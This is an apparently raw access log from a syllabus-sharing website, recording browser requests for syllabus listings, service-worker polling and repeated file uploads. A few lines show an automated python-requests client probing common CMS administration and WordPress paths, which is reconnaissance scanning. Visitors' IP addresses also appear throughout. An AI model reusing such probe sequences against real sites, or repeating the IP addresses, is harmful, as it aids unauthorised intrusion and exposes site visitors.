98.113.158.59 - - [01/Sep/2024:04:47:50 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:47:52 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
173.63.6.107 - - [01/Sep/2024:04:48:24 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:04:48:26 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2a09:bac3:a535:1973::289:d7 - - [01/Sep/2024:04:49:00 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:04:49:52 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:49:54 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:50:29 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
130.245.192.6 - - [01/Sep/2024:04:51:19 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
66.249.83.37 - - [01/Sep/2024:04:51:23 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)"
71.167.214.162 - - [01/Sep/2024:04:55:12 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
108.30.192.202 - - [01/Sep/2024:04:55:40 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
108.30.192.202 - - [01/Sep/2024:04:55:43 +0000] "GET /api/syllabi/7 HTTP/1.1" 200 43092 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
108.30.192.202 - - [01/Sep/2024:04:55:46 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
2600:4808:88f1:e400:ec17:d9d0:f6f8:da71 - - [01/Sep/2024:04:55:52 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
2600:4808:88f1:e400:ec17:d9d0:f6f8:da71 - - [01/Sep/2024:04:56:01 +0000] "GET /api/syllabi/18 HTTP/1.1" 200 1851589 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
98.113.158.59 - - [01/Sep/2024:04:56:16 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:56:18 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:56:18 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:56:20 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:56:54 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:56:55 +0000] "GET /api/syllabi/6 HTTP/1.1" 200 374134 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:56:56 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:57:00 +0000] "GET /api/syllabi/7 HTTP/1.1" 200 43092 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:57:01 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:57:31 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:57:37 +0000] "GET /api/syllabi HTTP/1.1" 200 2146 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:57:39 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2600:4808:8bf1:f801:58f4:cd56:1173:1b33 - - [01/Sep/2024:04:57:49 +0000] "GET /api/syllabi HTTP/1.1" 200 2146 "https://syllabus.website/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:58:19 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:58:25 +0000] "POST /api/upload HTTP/1.1" 200 175 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:04:58:55 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
71.190.32.215 - - [01/Sep/2024:04:59:26 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
71.190.32.215 - - [01/Sep/2024:04:59:36 +0000] "GET /api/syllabi/9 HTTP/1.1" 200 246933 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
130.245.192.2 - - [01/Sep/2024:04:59:45 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
130.245.192.8 - - [01/Sep/2024:04:59:57 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
130.245.192.4 - - [01/Sep/2024:05:00:07 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
71.190.32.215 - - [01/Sep/2024:05:00:42 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
71.190.32.215 - - [01/Sep/2024:05:00:53 +0000] "GET /api/syllabi/14 HTTP/1.1" 200 131554 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
108.6.224.14 - - [01/Sep/2024:05:01:48 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
108.6.224.14 - - [01/Sep/2024:05:01:50 +0000] "GET /api/syllabi/3 HTTP/1.1" 200 379405 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
108.6.224.14 - - [01/Sep/2024:05:01:55 +0000] "GET /api/syllabi/7 HTTP/1.1" 200 43092 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
38.91.100.66 - - [01/Sep/2024:05:02:18 +0000] "GET /api/syllabi HTTP/1.1" 200 2322 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
108.6.224.14 - - [01/Sep/2024:05:02:19 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:02:19 +0000] "POST /api/upload HTTP/1.1" 200 158 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
108.6.224.14 - - [01/Sep/2024:05:02:22 +0000] "GET /api/syllabi/3 HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
38.91.100.66 - - [01/Sep/2024:05:02:40 +0000] "GET /api/syllabi/5 HTTP/1.1" 200 96119 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:02:50 +0000] "POST /api/upload HTTP/1.1" 200 168 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:02:50 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:03:21 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:03:33 +0000] "POST /api/upload HTTP/1.1" 200 159 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:04:03 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:04:24 +0000] "POST /api/upload HTTP/1.1" 200 157 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:04:54 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:04:58 +0000] "POST /api/upload HTTP/1.1" 200 172 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:05:29 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:05:32 +0000] "POST /api/upload HTTP/1.1" 200 154 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:06:02 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:06:10 +0000] "POST /api/upload HTTP/1.1" 200 179 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2600:1017:b43e:ca90:f1c7:da99:511c:1202 - - [01/Sep/2024:05:06:17 +0000] "GET /api/syllabi HTTP/1.1" 200 3476 "https://syllabus.website/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
2600:1017:b43e:ca90:f1c7:da99:511c:1202 - - [01/Sep/2024:05:06:22 +0000] "GET /api/syllabi/5 HTTP/1.1" 200 96119 "https://syllabus.website/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
130.245.192.14 - - [01/Sep/2024:05:06:34 +0000] "GET /api/syllabi HTTP/1.1" 200 3476 "https://syllabus.website/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
98.113.158.59 - - [01/Sep/2024:05:06:37 +0000] "POST /api/upload HTTP/1.1" 200 170 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
69.127.113.42 - - [01/Sep/2024:05:06:57 +0000] "GET /api/syllabi HTTP/1.1" 200 3647 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
68.129.15.174 - - [01/Sep/2024:05:07:03 +0000] "GET /api/syllabi HTTP/1.1" 200 3647 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:07:07 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:07:15 +0000] "POST /api/upload HTTP/1.1" 200 172 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
69.127.113.42 - - [01/Sep/2024:05:07:28 +0000] "GET /api/syllabi/6 HTTP/1.1" 200 374134 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:07:40 +0000] "POST /api/upload HTTP/1.1" 200 159 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:08:06 +0000] "POST /api/upload HTTP/1.1" 200 162 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
69.127.113.42 - - [01/Sep/2024:05:08:24 +0000] "GET /api/syllabi HTTP/1.1" 200 4143 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:08:37 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:09:29 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.14.162.213 - - [01/Sep/2024:05:10:17 +0000] "GET /api/syllabi HTTP/1.1" 200 4143 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
98.14.162.213 - - [01/Sep/2024:05:10:20 +0000] "GET /api/syllabi HTTP/1.1" 200 4143 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:11:01 +0000] "POST /api/upload HTTP/1.1" 200 168 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:11:32 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:11:39 +0000] "POST /api/upload HTTP/1.1" 200 188 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
188.166.251.113 - - [01/Sep/2024:05:12:02 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 200 892 "-" "python-requests/2.18.4"
188.166.251.113 - - [01/Sep/2024:05:12:09 +0000] "GET /administrator/index.php HTTP/1.1" 200 892 "-" "python-requests/2.18.4"
188.166.251.113 - - [01/Sep/2024:05:12:10 +0000] "GET /view-source: HTTP/1.1" 200 892 "-" "python-requests/2.18.4"
188.166.251.113 - - [01/Sep/2024:05:12:10 +0000] "GET /misc/ajax.js HTTP/1.1" 200 892 "-" "python-requests/2.18.4"
98.113.158.59 - - [01/Sep/2024:05:12:10 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:12:19 +0000] "POST /api/upload HTTP/1.1" 200 149 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:12:23 +0000] "GET /api/syllabi/35 HTTP/1.1" 200 133592 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:12:24 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
24.189.178.219 - - [01/Sep/2024:05:12:31 +0000] "GET /api/syllabi HTTP/1.1" 200 4651 "https://syllabus.website/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
24.189.178.219 - - [01/Sep/2024:05:12:33 +0000] "GET /api/syllabi/3 HTTP/1.1" 200 379405 "https://syllabus.website/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:12:54 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:13:06 +0000] "POST /api/upload HTTP/1.1" 200 176 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.14.162.213 - - [01/Sep/2024:05:13:18 +0000] "POST /api/upload HTTP/1.1" 200 162 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:13:37 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:13:37 +0000] "POST /api/upload HTTP/1.1" 200 161 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:13:59 +0000] "POST /api/upload HTTP/1.1" 200 169 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2600:1017:b414:9b2:4142:3972:2fbb:131d - - [01/Sep/2024:05:14:00 +0000] "GET /api/syllabi HTTP/1.1" 200 5323 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
2600:1017:b414:9b2:4142:3972:2fbb:131d - - [01/Sep/2024:05:14:13 +0000] "GET /api/syllabi/30 HTTP/1.1" 200 199063 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:14:30 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2600:1017:b414:9b2:4142:3972:2fbb:131d - - [01/Sep/2024:05:14:31 +0000] "GET /api/syllabi HTTP/1.1" 304 - "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:14:32 +0000] "POST /api/upload HTTP/1.1" 200 162 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
2600:1017:b414:9b2:4142:3972:2fbb:131d - - [01/Sep/2024:05:14:40 +0000] "GET /api/syllabi/22 HTTP/1.1" 200 117719 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
130.245.192.15 - - [01/Sep/2024:05:14:40 +0000] "GET /api/syllabi HTTP/1.1" 200 5486 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
